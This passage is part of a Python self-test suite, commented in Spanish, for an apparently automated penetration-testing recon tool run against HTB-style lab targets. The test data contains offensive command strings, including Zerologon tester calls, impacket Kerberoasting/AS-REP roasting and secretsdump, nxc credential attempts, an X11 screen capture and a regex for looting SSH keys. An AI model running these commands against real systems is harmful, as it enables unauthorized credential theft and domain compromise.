    srv2019_svc = [{"port": 445, "scripts": {"smb-os-discovery": "OS: Windows Server 2019 Standard 17763"}}]
    assert _detect_win_build(srv2019_svc) == 17763   # no confunde el "2019" del nombre con el build real
    assert _detect_win_build([{"port": 80, "scripts": {}}]) is None
    old_exploits = [{"title": "Microsoft Windows XP/2000 - 'RPC DCOM' Remote (MS03-026)",
                     "edb": "66", "path": "/x", "platform": "windows", "type": "remote", "sev": "alta"},
                    {"title": "Vendor X - Modern RCE 2026", "edb": "99", "path": "/y",
                     "platform": "windows", "type": "remote", "sev": "alta"}]
    assert _OLD_OS_TITLE_RX.search(old_exploits[0]["title"])
    assert not _OLD_OS_TITLE_RX.search(old_exploits[1]["title"])
    md = build_markdown("10.10.10.10", ports, host, fprs, vlns, ["inlanefreight.htb"],
                        web_fix, vhost_fix, None, "2026-01-01 00:00")
    for needle in ("# palantir", "Quick wins", "share READ", "## SMB", "EDB-17491", "/admin", "| Puerto |"):
        assert needle in md, f"falta '{needle}' en el Markdown"
    assert "💡" in md and "NETLOGON" in md   # "share READ" trae su tip también en el Markdown
    assert "## WHOIS" in md and "## WHOIS ()" not in md   # ports=[] no debe dejar un '()' colgando
    assert "registrador: Foo" in md

    # _group_footprints_by_protocol + render agrupado: footprint anónimo + credenciales por
    # defecto + credenciales aportadas del MISMO protocolo van en UN solo grupo (antes 2-3
    # secciones separadas — el caso real que lo motivó: "Credenciales aportadas" mezclaba
    # TODOS los protocolos en un único bloque, sin distinguir SMB de LDAP). "msrpc" (footprint
    # anónimo, classify()) y "wmi" (como lo prueba nxc, _NXC_PROTO_OF) son el MISMO servicio
    # con nombres distintos — deben normalizarse al mismo grupo, no quedar partidos en dos.
    _grp_fprs = [
        {"proto": "msrpc", "title": "MSRPC / WMI", "ports": [135],
         "steps": [], "findings": [("info", "MSRPC expuesto")], "next": [], "missing": []},
        {"proto": "creds-wmi", "title": "Credenciales por defecto — WMI", "ports": [135],
         "steps": [{"cmd": "nxc wmi x -u Administrator -p ''", "ok": False,
                    "output": "STATUS_LOGON_FAILURE", "note": "n"}],
         "findings": [], "next": [], "missing": []},
        {"proto": "reuse-wmi", "title": "Credenciales aportadas — WMI", "ports": [135],
         "steps": [{"cmd": "nxc wmi x -u alice -p ***", "ok": True, "output": "[+] x\\alice:***", "note": "n"}],
         "findings": [("alta", "WMI: credencial aportada válida — «alice:***»")], "next": [], "missing": []},
    ]
    assert len(_group_footprints_by_protocol(_grp_fprs)) == 1   # msrpc+creds-wmi+reuse-wmi: UN grupo
    _gdoc = build_html("10.0.0.5", [], {}, _grp_fprs, [], [], {}, [], None, "2026-01-01 00:00")
    assert _gdoc.count('id="sec-fp-') == 1               # un solo <details> de protocolo, no 3
    assert "MSRPC / WMI" in _gdoc
    assert 'class="subhead"' in _gdoc and "Credenciales por defecto" in _gdoc and "Credenciales aportadas" in _gdoc
    assert 'details class="attempts"' in _gdoc            # "por defecto" (solo falló) va colapsado…
    assert "x\\alice" in _gdoc                            # …pero "aportadas" (tuvo éxito) se ve entero
    _gmd = build_markdown("10.0.0.5", [], {}, _grp_fprs, [], [], {}, [], None, "2026-01-01 00:00")
    assert _gmd.count("## MSRPC / WMI") == 1
    assert "### Credenciales aportadas" in _gmd           # sub-encabezado porque hay 2+ sub-bloques con contenido

    # _html_steps: solo colapsa si TODOS los pasos fallaron; con al menos 1 éxito, se ve entero
    assert "attempts" not in _html_steps(
        [{"cmd": "a", "ok": True, "output": "", "note": ""}, {"cmd": "b", "ok": False, "output": "", "note": ""}],
        collapsible=True)
    assert "attempts" in _html_steps([{"cmd": "a", "ok": False, "output": "", "note": ""}], collapsible=True)
    assert "attempts" not in _html_steps([{"cmd": "a", "ok": False, "output": "", "note": ""}], collapsible=False)

    # _fill_domain_placeholder: solo toca 'next' (los next-steps con el placeholder literal
    # "DOMINIO" — ver fp_kerberos/fp_msrpc), nunca 'steps' (lo que de verdad se ejecutó) ni nada
    # si no hay dominio conocido todavía.
    _dom_fprs = [{"proto": "kerberos", "title": "x", "ports": [88], "steps": [
                  {"cmd": "echo DOMINIO", "ok": True, "output": "", "note": ""}],
                  "findings": [], "next": ["GetNPUsers.py DOMINIO/ -no-pass"], "missing": []}]
    _fill_domain_placeholder(_dom_fprs, None)
    assert _dom_fprs[0]["next"] == ["GetNPUsers.py DOMINIO/ -no-pass"]          # sin dominio: no toca nada
    _fill_domain_placeholder(_dom_fprs, "nexura.htb")
    assert _dom_fprs[0]["next"] == ["GetNPUsers.py nexura.htb/ -no-pass"]       # con dominio: lo rellena
    assert _dom_fprs[0]["steps"][0]["cmd"] == "echo DOMINIO"                    # steps (ejecutados) intactos

    # netbios_computer_name: el mismo nombre que un operador tendría que ir a buscar a mano
    # para sustituir el placeholder NETBIOS-DEL-DC de Zerologon — ya lo capturan rdp-ntlm-info
    # (campo propio del protocolo, formato impacket/nmap), smb-os-discovery (a veces con un
    # '\x00' colgando, quirk conocido de ese script) o nbstat (formato real de nmap). Bug real
    # visto en un run contra INLANEFREIGHT.LOCAL: el operador copió el next-step de Zerologon
    # TAL CUAL con el placeholder sin sustituir y falló con STATUS_INVALID_COMPUTER_NAME —
    # nmap YA había capturado 'ACADEMY-EA-DC01' varias fases antes.
    _rdp_svc = [{"port": 3389, "scripts": {"rdp-ntlm-info": "Target_Name: INLANEFREIGHT\n"
                                           "NetBIOS_Computer_Name: ACADEMY-EA-DC01\n"
                                           "DNS_Domain_Name: INLANEFREIGHT.LOCAL"}}]
    assert netbios_computer_name(_rdp_svc, {}) == "ACADEMY-EA-DC01"
    _nbt_svc = [{"port": 139, "scripts": {}}]
    assert netbios_computer_name(_nbt_svc, {"nbstat": "NetBIOS name: ACADEMY-EA-DC01, "
                                             "NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:f7:f2"}) == "ACADEMY-EA-DC01"
    _smbos_svc = [{"port": 445, "scripts": {"smb-os-discovery":
                  "OS: Windows Server 2019\nComputer name: ACADEMY-EA-DC01\n"
                  "NetBIOS computer name: ACADEMY-EA-DC01\\x00\nDomain name: INLANEFREIGHT.LOCAL"}}]
    assert netbios_computer_name(_smbos_svc, {}) == "ACADEMY-EA-DC01"         # sin el '\x00' colgando
    assert netbios_computer_name([{"port": 80, "scripts": {}}], {}) is None   # ninguno de los 3 corrió

    # _fill_netbios_placeholder: mismo patrón que _fill_domain_placeholder, pero para
    # "NETBIOS-DEL-DC" — toca 'next', nunca 'steps', y nada si el nombre no se conoce.
    _nb_fprs = [{"proto": "smb", "title": "x", "ports": [445], "steps": [
                 {"cmd": "echo NETBIOS-DEL-DC", "ok": True, "output": "", "note": ""}],
                 "findings": [], "next": ["zerologon_tester.py NETBIOS-DEL-DC 10.0.0.1"], "missing": []}]
    _fill_netbios_placeholder(_nb_fprs, None)
    assert _nb_fprs[0]["next"] == ["zerologon_tester.py NETBIOS-DEL-DC 10.0.0.1"]   # sin nombre: no toca nada
    _fill_netbios_placeholder(_nb_fprs, "ACADEMY-EA-DC01")
    assert _nb_fprs[0]["next"] == ["zerologon_tester.py ACADEMY-EA-DC01 10.0.0.1"]  # con nombre: lo rellena
    assert _nb_fprs[0]["steps"][0]["cmd"] == "echo NETBIOS-DEL-DC"                  # steps (ejecutados) intactos

    # _impacket_suggest_bin: BUG real confirmado por un operador en Kali — el next-step de
    # GetNPUsers/GetUserSPNs sugería el nombre viejo "<Nombre>.py", pero el paquete apt
    # impacket-scripts los instala como "impacket-<Nombre>" (sin ".py"); tuvo que corregir el
    # comando a mano para que funcionara. Se mockea _bin_with_sudo_fallback (no el disco real).
    _real_bwsf = globals()["_bin_with_sudo_fallback"]
    globals()["_bin_with_sudo_fallback"] = lambda names, **kw: "impacket-GetNPUsers"
    try:
        assert _impacket_suggest_bin("GetNPUsers") == "impacket-GetNPUsers"   # instalado por apt: se usa ese
    finally:
        globals()["_bin_with_sudo_fallback"] = _real_bwsf
    globals()["_bin_with_sudo_fallback"] = lambda names, **kw: None
    try:
        assert _impacket_suggest_bin("GetUserSPNs") == "GetUserSPNs.py"   # ninguno instalado: nombre histórico
    finally:
        globals()["_bin_with_sudo_fallback"] = _real_bwsf
    # fp_kerberos: el next-step de AS-REP roast/Kerberoasting usa el nombre YA RESUELTO, no
    # el "GetNPUsers.py"/"GetUserSPNs.py" fijo de siempre.
    globals()["_bin_with_sudo_fallback"] = lambda names, **kw: f"impacket-{names[0].split('-', 1)[-1]}" if names[0].startswith("impacket-") else None
    try:
        _kb_fpr = fp_kerberos("10.0.0.1", [{"port": 88, "name": "kerberos-sec", "scripts": {}}],
                              [{"port": 88, "name": "kerberos-sec", "scripts": {}}], {}, False)
    finally:
        globals()["_bin_with_sudo_fallback"] = _real_bwsf
    assert any("impacket-GetNPUsers " in n for n in _kb_fpr["next"]), _kb_fpr["next"]
    assert any("impacket-GetUserSPNs " in n for n in _kb_fpr["next"]), _kb_fpr["next"]
    assert not any("GetNPUsers.py" in n or "GetUserSPNs.py" in n for n in _kb_fpr["next"])

    # _secretsdump_bin: el nombre de apt ('impacket-secretsdump') va PRIMERO — confirmado
    # contra un Kali real que no tiene 'secretsdump.py' así en el PATH (ver _impacket_suggest_bin
    # más arriba, mismo hallazgo). Antes se miraba al revés; seguía acertando por el fallback,
    # pero probar primero el que de verdad suele estar ahorra una consulta al PATH de más.
    _bwsf_calls = []
    globals()["_bin_with_sudo_fallback"] = lambda names, **kw: (_bwsf_calls.append(names), None)[1]
    try:
        _secretsdump_bin()
        assert _bwsf_calls[-1] == ("impacket-secretsdump", "secretsdump.py"), _bwsf_calls[-1]
    finally:
        globals()["_bin_with_sudo_fallback"] = _real_bwsf

    # NFS: detección de no_root_squash (root escape) y exports escribibles
    nfs_out = ("NFS 10.0.0.1 60515 X [*] Supported NFS versions: (3, 4) (root escape:True)\n"
               "NFS 10.0.0.1 60515 X 65534 rw- 3.3GB/3.9GB /var/nfs 10.0.0.0/8\n"
               "NFS 10.0.0.1 60515 X 65534 r-- 3.3GB/3.9GB /mnt/ro 10.0.0.0/8")
    assert re.search(r"root escape:\s*True", nfs_out, re.I)
    assert re.findall(r"\b(rw-|r--)\s+\S+\s+(/\S+)", nfs_out) == [("rw-", "/var/nfs"), ("r--", "/mnt/ro")]
    assert _SMB_LOOT_RE.search("id_rsa") and not _SMB_LOOT_RE.search("readme.md")
    # multi-objetivo: expansión de IP / CIDR / rango / dedupe / comentarios (sin DNS)
    assert expand_targets(["10.10.10.5"]) == [("10.10.10.5", "")]
    assert expand_targets(["10.10.10.0/30"]) == [("10.10.10.1", ""), ("10.10.10.2", "")]
    assert expand_targets(["10.10.10.1-3"]) == [("10.10.10.1", ""), ("10.10.10.2", ""), ("10.10.10.3", "")]
    assert expand_targets(["10.10.10.5", "10.10.10.5"]) == [("10.10.10.5", "")]
    assert expand_targets(["# comentario", "", "  "]) == []
    # Fase 0 (ping-sweep): qué specs son "multi-host" (podables) y qué IPs salen de ellos.
    assert _is_multihost_spec("10.0.0.0/24") is True
    assert _is_multihost_spec("10.0.0.1-5") is True
    assert _is_multihost_spec("10.0.0.5") is False       # IP suelta: nunca se poda
    assert _is_multihost_spec("10.0.0.5/32") is False    # /32: una sola IP, tampoco
    assert _is_multihost_spec("host.htb") is False       # hostname: nunca se poda
    # _sweepable_ips: SOLO las IPs del CIDR/rango; la IP suelta escrita a mano queda fuera.
    assert _sweepable_ips(["10.0.0.0/30", "1.2.3.4"]) == {"10.0.0.1", "10.0.0.2"}
    assert _sweepable_ips(["10.0.0.1-3"]) == {"10.0.0.1", "10.0.0.2", "10.0.0.3"}
    assert _sweepable_ips(["1.2.3.4", "host.htb"]) == set()
    # _parse_sweep_up: se queda solo con los 'Status: Up' de la salida greppable de -sn.
    _gn = ("Host: 192.168.1.50 ()\tStatus: Up\n"
           "Host: 192.168.1.51 ()\tStatus: Down\n"
           "Host: 192.168.1.60 (foo)\tStatus: Up")
    assert _parse_sweep_up(_gn) == {"192.168.1.50", "192.168.1.60"}
    assert _parse_sweep_up("") == set()
    # dedupe por (ip, nombre): dos hostnames DISTINTOS a la MISMA IP (WAF/CDN anycast)
    # se conservan los dos — antes, dedup por ip a secas, se perdía uno en silencio.
    # Sin red: fijamos la resolución a una IP fija.
    _real_ghbn = socket.gethostbyname
    socket.gethostbyname = lambda h: "1.2.3.4"
    try:
        assert expand_targets(["a.example.com", "b.example.com"]) == \
            [("1.2.3.4", "a.example.com"), ("1.2.3.4", "b.example.com")]
    finally:
        socket.gethostbyname = _real_ghbn
    # target_folders: namespacea la carpeta SOLO cuando dos objetivos comparten ip —
    # el caso normal (una ip, un objetivo) conserva la carpeta de siempre (la ip a secas).
    assert target_folders([("10.10.10.5", ""), ("10.10.10.6", "foo.htb")]) == \
        {("10.10.10.5", ""): "10.10.10.5", ("10.10.10.6", "foo.htb"): "10.10.10.6"}
    # colisión IP suelta + hostname al mismo ip: la IP suelta conserva su carpeta de
    # siempre, solo el hostname se namespacea (no sorprende al caso de un único objetivo).
    assert target_folders([("1.2.3.4", ""), ("1.2.3.4", "vhost.site.com")]) == \
        {("1.2.3.4", ""): "1.2.3.4", ("1.2.3.4", "vhost.site.com"): "1.2.3.4_vhost.site.com"}
    # colisión de dos hostnames (el caso real: CDN/anycast) → los dos namespaced y distintos
    _tf = target_folders([("1.2.3.4", "a.example.com"), ("1.2.3.4", "b.example.com")])
    assert _tf[("1.2.3.4", "a.example.com")] == "1.2.3.4_a.example.com"
    assert _tf[("1.2.3.4", "b.example.com")] == "1.2.3.4_b.example.com"
    # saneado: sin barras en el nombre → ninguna carpeta puede escapar de <outdir>/
    _tf2 = target_folders([("5.6.7.8", ""), ("5.6.7.8", "weird/../host:name")])
    assert "/" not in _tf2[("5.6.7.8", "weird/../host:name")]
    # ~/.palantirrc: flags por defecto (varios por línea, '#' comenta)
    with tempfile.NamedTemporaryFile("w", suffix=".palantirrc", delete=False, encoding="utf-8") as f:
        f.write("--no-fuzz --profile big   # mis defaults\n--top\n# línea comentada entera\n")
        rcp = f.name
    assert _load_rc_args(rcp) == ["--no-fuzz", "--profile", "big", "--top"]
    os.unlink(rcp)
    assert _load_rc_args("/no/existe/.palantirrc") == []

    # --tcp-connect: CONNECT=True fuerza connect scan (-sT) pase lo que pase con root
    _sc = CONNECT
    globals()["CONNECT"] = True
    assert scan_type() == "-sT"
    globals()["CONNECT"] = False
    assert scan_type() in ("-sS", "-sT")
    globals()["CONNECT"] = _sc

    # footprint_web_slow: si ninguno de los 4 flags lentos está encendido, es un
    # no-op de coste cero — no toca los footprints que le pasen (puro, sin red).
    _ns, _nn, _nc, _nr = NIKTO, NUCLEI, CMS_SCAN, CRAWL
    globals()["NIKTO"] = globals()["NUCLEI"] = globals()["CMS_SCAN"] = globals()["CRAWL"] = False
    _dummy_fp = [_fp("web", "Web http://:80", [80])]
    _dummy_fp[0]["findings"].append(("info", "marcador — no debe tocarse"))
    _before = json.dumps(_dummy_fp)
    footprint_web_slow("10.0.0.1", [{"port": 80}], _dummy_fp, {}, {}, False, hostname=None)
    assert json.dumps(_dummy_fp) == _before   # ni un finding/step tocado
    globals()["NIKTO"], globals()["NUCLEI"], globals()["CMS_SCAN"], globals()["CRAWL"] = _ns, _nn, _nc, _nr

    # --jobs: salida etiquetada por hilo (_TaggedStdout) y commands.log thread-local
    import io as _io
    real = _io.StringIO()
    tg = _TaggedStdout(real)
    _TLS.tag = "[X] "
    tg.write("uno\ndos\n")
    _TLS.tag = ""
    tg.write("plano\n")
    assert real.getvalue() == "[X] uno\n[X] dos\nplano\n", real.getvalue()
    d1, d2 = Path(tempfile.mkdtemp()), Path(tempfile.mkdtemp())
    def _wlog(d, msg):
        _set_commands_log(d / "commands.log"); _log(msg)
    t1 = threading.Thread(target=_wlog, args=(d1, "cmdA"))
    t2 = threading.Thread(target=_wlog, args=(d2, "cmdB"))
    t1.start(); t2.start(); t1.join(); t2.join()
    assert (d1 / "commands.log").read_text().strip() == "cmdA"
    assert (d2 / "commands.log").read_text().strip() == "cmdB"
    _set_commands_log(None)   # no dejar el log del hilo principal apuntando a un tmp

    # write_index: agrega lo que cada carpeta YA escribió en su findings.json (no reescanea
    # nada); el objetivo sin findings.json se señala (con error.log si lo tiene) sin romper
    # el resto del índice.
    _idx_dir = Path(tempfile.mkdtemp())
    (_idx_dir / "10.10.10.5").mkdir()
    (_idx_dir / "10.10.10.5" / "findings.json").write_text(json.dumps({
        "ports": [{"port": 80}, {"port": 445}],
        "findings": [{"sev": "alta", "text": "x"}, {"sev": "info", "text": "y"}],
        "generated": "2026-10-13 10:00",
    }), encoding="utf-8")
    (_idx_dir / "10.10.10.6").mkdir()
    (_idx_dir / "10.10.10.6" / "error.log").write_text("boom", encoding="utf-8")
    # 10.10.10.7: SIN nombre por CLI, pero el propio escaneo descubrió el hostname (SMB/LDAP/
    # DNS) — el índice debe mostrarlo igual que ya hace cada report.md individual (misma
    # clave "domains"), sin que haga falta habérselo dado a mano en el target.
    (_idx_dir / "10.10.10.7").mkdir()
    (_idx_dir / "10.10.10.7" / "findings.json").write_text(json.dumps({
        "ports": [{"port": 445}], "findings": [], "domains": ["dc01.nexura.htb", "nexura.htb"],
        "generated": "2026-10-22 17:52",
    }), encoding="utf-8")
    # 10.10.10.8: nombre dado por CLI (--vhost/--targets), persistido en el JSON por
    # write_reports (campo "name") — el índice debe preferirlo sobre "domains".
    (_idx_dir / "10.10.10.8").mkdir()
    (_idx_dir / "10.10.10.8" / "findings.json").write_text(json.dumps({
        "target": "10.10.10.8", "name": "bar.htb",
        "ports": [{"port": 22}], "findings": [], "generated": "2026-10-24 09:00",
    }), encoding="utf-8")
    write_index(str(_idx_dir))   # sin targets/folders: lee del disco, acumulativo entre runs
    _idx_html = (_idx_dir / "index.html").read_text(encoding="utf-8")
    assert '10.10.10.5/report.html">10.10.10.5</a>' in _idx_html   # el que SÍ tiene informe, enlazado
    assert "10.10.10.6" in _idx_html and "ver error.log" in _idx_html   # el que falló, señalado
    assert "10.10.10.7 (dc01.nexura.htb, nexura.htb)" in _idx_html   # hostname DESCUBIERTO, sin --targets/nombre explícito
    assert "10.10.10.8 (bar.htb)" in _idx_html   # nombre explícito persistido en el JSON
    assert "4 objetivos" in _idx_html
    # Una 2ª llamada sobre el MISMO outdir (otra sesión, otro objetivo) sigue mostrando
    # los 4 anteriores — el índice es del outdir, no del run que lo generó.
    (_idx_dir / "10.10.10.9").mkdir()
    (_idx_dir / "10.10.10.9" / "findings.json").write_text(json.dumps({
        "target": "10.10.10.9", "ports": [], "findings": [], "generated": "2026-10-24 09:05",
    }), encoding="utf-8")
    write_index(str(_idx_dir))
    _idx_html2 = (_idx_dir / "index.html").read_text(encoding="utf-8")
    assert "5 objetivos" in _idx_html2 and "10.10.10.9" in _idx_html2 and "10.10.10.5" in _idx_html2

    # _make_hostname_symlinks: symlink de conveniencia por hostname ESPECÍFICO, nunca por el
    # dominio base a secas (lo comparten todas las cajas del dominio AD y se pisarían).
    _sym_dir = Path(tempfile.mkdtemp())
    (_sym_dir / "10.10.10.11").mkdir()
    _make_hostname_symlinks(str(_sym_dir), "10.10.10.11", ["dc01.nexura.htb", "nexura.htb"])
    assert (_sym_dir / "dc01.nexura.htb").is_symlink()
    assert (_sym_dir / "dc01.nexura.htb").resolve() == (_sym_dir / "10.10.10.11").resolve()
    assert not (_sym_dir / "nexura.htb").exists()             # dominio base: NO symlinkeado
    _make_hostname_symlinks(str(_sym_dir), "10.10.10.11", ["dc01.nexura.htb"])   # re-run/--resume: idempotente
    assert (_sym_dir / "dc01.nexura.htb").is_symlink()
    # otra caja intenta registrar el MISMO hostname (raro, pero no debe pisar el symlink ajeno)
    (_sym_dir / "10.10.10.12").mkdir()
    _make_hostname_symlinks(str(_sym_dir), "10.10.10.12", ["dc01.nexura.htb"])
    assert (_sym_dir / "dc01.nexura.htb").resolve() == (_sym_dir / "10.10.10.11").resolve()   # intacto

    # --resume real: _ports_signature + _resume_reuse_ok deciden si footprint/searchsploit/
    # creds por defecto se reutilizan del findings.json anterior en vez de repetirse.
    _svcs_a = [{"port": 445, "proto": "tcp"}, {"port": 53, "proto": "udp"}]
    _svcs_b = [{"port": 53, "proto": "udp"}, {"port": 445, "proto": "tcp"}]       # mismo conjunto, otro orden
    _svcs_c = [{"port": 445, "proto": "tcp"}, {"port": 3389, "proto": "tcp"}]     # puertos DISTINTOS
    assert _ports_signature(_svcs_a) == _ports_signature(_svcs_b)
    assert _ports_signature(_svcs_a) != _ports_signature(_svcs_c)
    _prev_findings = {"ports": _svcs_a, "phases_done": ["footprint", "searchsploit", "creds_default"]}
    assert _resume_reuse_ok(True, _prev_findings, False, _svcs_b) is True     # --resume, sin re-escaneo, mismos puertos
    assert _resume_reuse_ok(False, _prev_findings, False, _svcs_b) is False   # sin --resume: nunca se reutiliza
    assert _resume_reuse_ok(True, None, False, _svcs_b) is False             # sin findings.json anterior
    assert _resume_reuse_ok(True, _prev_findings, True, _svcs_b) is False    # algún nmap SÍ re-escaneó de verdad
    assert _resume_reuse_ok(True, _prev_findings, False, _svcs_c) is False   # puertos distintos: no reutilizable

    # _load_prev_findings: None si no hay fichero o está corrupto (fallback seguro: todo de cero)
    _lpf_dir = Path(tempfile.mkdtemp())
    assert _load_prev_findings(_lpf_dir) is None
    (_lpf_dir / "findings.json").write_text("{not valid json", encoding="utf-8")
    assert _load_prev_findings(_lpf_dir) is None

    # write_reports: si RENDERIZAR un informe peta (bug tipo TypeError/KeyError), no debe abortar el
    # resto — sobre todo findings.json. Regresión del crash de _all_findings con findings-lista en --resume.
    import contextlib as _ctx, io as _io
    _wr_dir = Path(tempfile.mkdtemp())
    _wr_svc = [{"port": 80, "proto": "tcp", "name": "http", "product": "Apache", "version": "2.4",
                "extrainfo": "", "banner": "", "scripts": {}}]
    _real_bh = build_html
    globals()["build_html"] = lambda *a, **k: (_ for _ in ()).throw(RuntimeError("render boom"))
    try:
        with _ctx.redirect_stdout(_io.StringIO()), _ctx.redirect_stderr(_io.StringIO()):
            write_reports(_wr_dir, "1.2.3.4", _wr_svc, {}, [], [], [], {}, [], "x.htb",
                          quiet=True, phases_done=[])
    finally:
        globals()["build_html"] = _real_bh
    assert (_wr_dir / "findings.json").is_file()      # el JSON se escribió pese al fallo del HTML
    assert not (_wr_dir / "report.html").is_file()    # el HTML petó y se saltó, sin tumbar el resto

    # _phase_fail: una fase que peta se registra en error.log y NO re-lanza (el run sigue → hay informe final)
    _pf_dir = Path(tempfile.mkdtemp())
    try:
        raise RuntimeError("boom-fase")
    except Exception as _pe:
        with _ctx.redirect_stdout(_io.StringIO()), _ctx.redirect_stderr(_io.StringIO()):
            _phase_fail("test", _pe, _pf_dir)
    assert (_pf_dir / "error.log").is_file() and "boom-fase" in (_pf_dir / "error.log").read_text()
    # _norm_fp: rellena claves que faltan en footprints reutilizados (--resume de json viejo) sin pisar las que hay
    _nf = _norm_fp({"proto": "ftp"})
    assert _nf["findings"] == [] and _nf["next"] == [] and _nf["steps"] == [] and _nf["title"] == "FTP"
    assert _norm_fp({"proto": "smb", "findings": [["alta", "x"]], "title": "SMB"})["findings"] == [["alta", "x"]]

    # Regresión CRÍTICA: el informe "temprano" de run_one (antes de la Fase 5, con banner +
    # auto-refresh) NO debe vaciar findings.json en un --resume con datos previos buenos. El bug:
    # antes se llamaba a write_reports(..., [], [], ..., phases_done=[], ...) a secas, PISANDO
    # el findings.json de un run anterior con uno vacío antes de que la Fase 5 real lo recalculara
    # — si el proceso se interrumpía (Ctrl-C) o petaba antes del write_reports FINAL, ese
    # findings.json quedaba vacío PARA SIEMPRE. El fix: reutilizar lo que ya haya en `prev` en vez
    # de vaciarlo. Se simula aquí EXACTAMENTE lo que run_one calcula ahora (_early_footprints/
    # _early_phases_done) y se confirma, con write_reports de verdad (no un mock), que el
    # findings.json resultante conserva los datos del `prev` en vez de quedar a [].
    _prevgood = {"footprints": [{"proto": "smb", "title": "SMB", "findings": [["alta", "share legible"]], "ports": [445]}],
                 "phases_done": ["footprint", "searchsploit", "creds_default"], "vulns": []}
    _early_dir = Path(tempfile.mkdtemp())
    _early_footprints_sim = [_norm_fp(f) for f in _prevgood.get("footprints", [])] if _prevgood else []
    _early_phases_sim = list(_prevgood.get("phases_done", [])) if _prevgood else []
    with _ctx.redirect_stdout(_io.StringIO()):
        write_reports(_early_dir, "1.2.3.4", _wr_svc, {}, _early_footprints_sim, [], [], {}, [], None,
                      preliminary=True, quiet=True, phases_done=_early_phases_sim)
    _early_json = json.loads((_early_dir / "findings.json").read_text())
    assert _early_json["footprints"] and _early_json["footprints"][0]["proto"] == "smb", _early_json
    assert _early_json["phases_done"] == ["footprint", "searchsploit", "creds_default"], _early_json
    # sin `prev` (primer run, no --resume, o --resume sin findings.json previo): sigue arrancando
    # en blanco como siempre — el fix no inventa datos que no existían.
    _prevnone = None
    assert ([_norm_fp(f) for f in _prevnone.get("footprints", [])] if _prevnone else []) == []
    assert (list(_prevnone.get("phases_done", [])) if _prevnone else []) == []

    # Regresión: phases_done solo marca una fase como "hecha" si de verdad se completó (reutilizada
    # de un prev_phases válido, o terminó sin que _phase_fail la atrapara) — antes se construía
    # mirando SOLO los flags de CLI, así que una fase que petaba y caía en _phase_fail se guardaba
    # igual como "hecha" en findings.json, y un futuro --resume se la saltaba dándola por buena.
    footprint_ok = searchsploit_ok = creds_default_ok = False   # simula el caso "la fase petó"
    _phases_done_sim = []
    if footprint_ok:
        _phases_done_sim.append("footprint")
    if searchsploit_ok:
        _phases_done_sim.append("searchsploit")
    if creds_default_ok:
        _phases_done_sim.append("creds_default")
    assert _phases_done_sim == []   # ninguna se completó → ninguna debe marcarse "hecha"
    footprint_ok = True   # simula el caso "se completó bien" (o se reutilizó de prev_phases)
    _phases_done_sim2 = ["footprint"] if footprint_ok else []
    assert _phases_done_sim2 == ["footprint"]
    (_lpf_dir / "findings.json").write_text(json.dumps({"ports": _svcs_a}), encoding="utf-8")
    assert _load_prev_findings(_lpf_dir)["ports"] == _svcs_a

    # ── Protocolos nuevos (finger / IPP-CUPS / X11 / git daemon): classify + parsers puros ──
    assert classify({"name": "finger", "port": 79}) == "finger"
    assert classify({"name": "", "port": 79}) == "finger"
    assert classify({"name": "ipp", "port": 631}) == "ipp"
    assert classify({"name": "cups", "port": 8631}) == "ipp"
    assert classify({"name": "x11", "port": 6000}) == "x11"
    assert classify({"name": "", "port": 6005}) == "x11"
    assert classify({"name": "", "port": 5906}) == "vnc"        # VNC (5900-5906) no se solapa con X11 (6000+)
    assert classify({"name": "git", "port": 9418}) == "gitdaemon"

    # finger: extracción de usuarios de una tabla real (cabecera y avisos fuera, sin duplicados)
    _finger_out = ("Login     Name       Tty      Idle  Login Time\n"
                   "root      root       *:0        1d  Mon 10:00\n"
                   "mrb3n     Ben         pts/0      -   Tue 09:00\n"
                   "root      root       console    2d  Sun 08:00\n"
                   "no such user\n")
    assert _parse_finger_users(_finger_out) == ["root", "mrb3n"]
    assert _parse_finger_users("") == []

    # X11: ¿display abierto? · CUPS: versión de la cabecera Server/cuerpo
    assert _x11_access_granted("| x11-access: X server access is granted") is True
    assert _x11_access_granted("| x11-access: X server access is denied") is False
    assert _cups_version("Server: CUPS/2.4.2 IPP/2.1") == "2.4.2"
    assert _cups_version("Server: nginx") is None

    # _nxc_has_data: distingue una enum con DATOS de una sesión aceptada ([+]) pero sin
    # autorización (solo banner [*] + login [+] + error [-]). Es la compuerta que evita
    # lanzar --users/--groups/--pass-pol/etc. tras un login que no devuelve nada.
    _nxc_denied = ("SMB  10.10.10.11  445  DC01  [*] Windows Server 2019 Build 17763 x64\n"
                   "SMB  10.10.10.11  445  DC01  [+] nexura.htb\\: \n"
                   "SMB  10.10.10.11  445  DC01  [-] Error enumerating domain users: STATUS_ACCESS_DENIED\n")
    _nxc_rid_ok = ("SMB  10.10.10.11  445  DC01  [+] nexura.htb\\: \n"
                   "SMB  10.10.10.11  445  DC01  500: NEXURA\\Administrator (SidTypeUser)\n")
    _nxc_ldap_ok = ("LDAP  10.10.10.11  389  DC01  [+] nexura.htb\\: \n"
                    "LDAP  10.10.10.11  389  DC01  Administrator\n")
    assert _nxc_has_data(_nxc_denied) is False
    assert _nxc_has_data(_nxc_rid_ok) is True
    assert _nxc_has_data(_nxc_ldap_ok) is True
    assert _nxc_has_data("") is False
    assert _nxc_has_data("SMB  1.1.1.1  445  H  [+] dom\\: ") is False   # solo login, sin datos

    # _fast_scan_timing: el modo túnel/pivot QUITA --min-rate (la causa de que se pierdan
    # puertos por un relay userland) y sube los reintentos; stealth tiene prioridad.
    assert _fast_scan_timing(False, False, 5000) == ["-T4", "--min-rate", "5000", "--max-retries", "2"]
    _tun = _fast_scan_timing(False, True, 5000)
    assert "--min-rate" not in _tun and _tun == ["-T3", "--max-retries", "10"], _tun
    assert _fast_scan_timing(True, True, 5000)[0] == "-T2"   # stealth gana sobre tunnel
    assert "--min-rate" not in _fast_scan_timing(True, False, 5000)

    # _fmt_elapsed: unidades a cero omitidas por la izquierda
    assert _fmt_elapsed(5) == "5s"
    assert _fmt_elapsed(75) == "1m 15s"
    assert _fmt_elapsed(3725) == "1h 2m 5s"

    # print_run_summary: no revienta y trae lo esencial (tiempo, puertos, severidad, 'empieza por')
    import io as _io_sum, contextlib as _ctx_sum
    _svc6000 = fake(port=6000, name="x11"); _svc6000["proto"] = "tcp"; _svc6000["state"] = "open"
    _fpx = _fp("x11", "X11", [6000])
    _fpx["findings"].append(("alta", "X11 en :6000 SIN control de acceso (display :0)"))
    _fpx["next"].append("xwd -display IP:0 -root -out /tmp/x11.xwd   # captura de pantalla")
    _sumbuf = _io_sum.StringIO()
    with _ctx_sum.redirect_stdout(_sumbuf):
        print_run_summary("10.10.10.9", "box.htb", Path(tempfile.mkdtemp()),
